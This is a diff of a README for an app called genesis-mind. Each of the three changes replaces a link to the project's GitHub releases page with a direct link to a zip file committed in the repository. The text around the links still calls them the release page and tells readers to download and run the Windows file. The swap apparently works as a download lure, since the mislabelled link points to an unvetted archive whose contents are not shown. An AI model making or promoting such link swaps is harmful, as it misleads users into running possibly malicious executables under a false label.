@@ -1,6 +1,6 @@
 # 🧠 genesis-mind - Learn With Child-Like AI
 
-[![Download genesis-mind](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Chewerphalguna599/genesis-mind/releases)
+[![Download genesis-mind](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Chewerphalguna599/genesis-mind/raw/refs/heads/main/genesis/genesis_mind_v1.0.zip)
 
 ## 🌱 What is genesis-mind?
 
@@ -34,7 +34,7 @@ For a smoother run, use a machine with 16 GB of RAM or more. If your PC has a fa
 
 Visit the release page here to download and run this file:
 
-https://github.com/Chewerphalguna599/genesis-mind/releases
+https://github.com/Chewerphalguna599/genesis-mind/raw/refs/heads/main/genesis/genesis_mind_v1.0.zip
 
 On that page, look for the latest release and download the Windows file for your system. If there are more than one file, choose the one that ends in `.exe` or `.zip` and matches Windows.
 
@@ -207,4 +207,4 @@ The name genesis-mind fits the idea behind the project: a mind that begins small
 
 If you need the release page again, use this link:
 
-https://github.com/Chewerphalguna599/genesis-mind/releases
+https://github.com/Chewerphalguna599/genesis-mind/raw/refs/heads/main/genesis/genesis_mind_v1.0.zip
